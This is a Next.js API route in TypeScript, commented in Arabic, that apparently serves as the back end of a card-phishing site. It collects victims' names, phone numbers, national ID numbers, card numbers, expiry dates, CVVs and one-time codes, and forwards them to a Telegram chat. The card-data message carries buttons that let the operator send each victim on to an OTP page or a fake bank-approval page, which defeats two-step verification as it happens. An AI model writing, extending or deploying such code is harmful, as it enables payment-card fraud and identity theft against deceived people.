import type { NextApiRequest, NextApiResponse } from 'next';
import axios from 'axios';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables');
}

// تخزين الجلسات في global لمشاركتها بين جميع API routes
declare global {
  var __sessions: Record<string, { action: string | null; timestamp: number; cardData?: any }> | undefined;
  var __messageToSession: Record<number, string> | undefined;
}

if (!global.__sessions) {
  global.__sessions = {};
}
if (!global.__messageToSession) {
  global.__messageToSession = {};
}

const sessions = global.__sessions;
const messageToSession = global.__messageToSession;

// إرسال رسالة مع أزرار إلى Telegram
async function sendTelegramWithButtons(message: string, buttons: any[][]) {
  try {
    const response = await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: buttons,
        },
      }
    );
    return response.data;
  } catch (error: any) {
    console.error('خطأ Telegram:', error.message);
    return null;
  }
}

// إرسال رسالة عادية إلى Telegram
async function sendTelegramMessage(message: string) {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    });
    return { success: true };
  } catch (error: any) {
    console.error('خطأ Telegram:', error.message);
    return { success: false };
  }
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    const { type, data } = req.body;
    let message = '';
    const sessionId = data.sessionId || `session_${Date.now()}`;

    if (type === 'personal') {
      // المعلومات الشخصية
      message =
        `📋 <b>معلومات شخصية جديدة</b>\n\n` +
        `👤 <b>الاسم:</b> ${data.fullName || 'غير معروف'}\n` +
        `📱 <b>الهاتف:</b> ${data.phoneNumber || 'غير معروف'}\n` +
        `🆔 <b>الهوية:</b> ${data.nationalId || 'غير معروف'}\n` +
        `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;

      await sendTelegramMessage(message);
    } else if (type === 'card') {
      // بيانات البطاقة مع الأزرار
      message =
        `💳 <b>بيانات البطاقة المصرفية</b>\n\n` +
        `👤 <b>حامل البطاقة:</b> ${data.holderName || ''}\n` +
        `💳 <b>رقم البطاقة:</b> ${data.cardNumber || ''}\n` +
        `📅 <b>تاريخ الانتهاء:</b> ${data.expiry || ''}\n` +
        `🔒 <b>CVV:</b> ${data.cvv || ''}\n\n` +
        `👤 <b>الاسم:</b> ${data.fullName || ''}\n` +
        `📱 <b>الهاتف:</b> ${data.phoneNumber || ''}\n` +
        `🆔 <b>الهوية:</b> ${data.nationalId || ''}\n` +
        `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;

      const buttons = [
        [
          { text: '🔐 توجيه إلى OTP', callback_data: `otp_${sessionId}` },
          { text: '🏦 توجيه إلى موافقة البنك', callback_data: `bank_${sessionId}` },
        ],
      ];

      const result = await sendTelegramWithButtons(message, buttons);

      if (result && result.result && result.result.message_id) {
        // حفظ ربط معرف الرسالة بالجلسة
        messageToSession[result.result.message_id] = sessionId;
        sessions[sessionId] = {
          action: null,
          timestamp: Date.now(),
          cardData: data,
        };
      }
    } else if (type === 'otp') {
      // رمز OTP
      message =
        `🔐 <b>رمز OTP مدخل</b>\n\n` +
        `🔢 <b>الرمز:</b> ${data.otp || ''}\n` +
        `💳 <b>رقم البطاقة:</b> ${data.cardNumber || ''}\n` +
        `👤 <b>الاسم:</b> ${data.fullName || ''}\n` +
        `📱 <b>الهاتف:</b> ${data.phoneNumber || ''}\n` +
        `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;

      await sendTelegramMessage(message);
    }

    res.status(200).json({ success: true });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
}
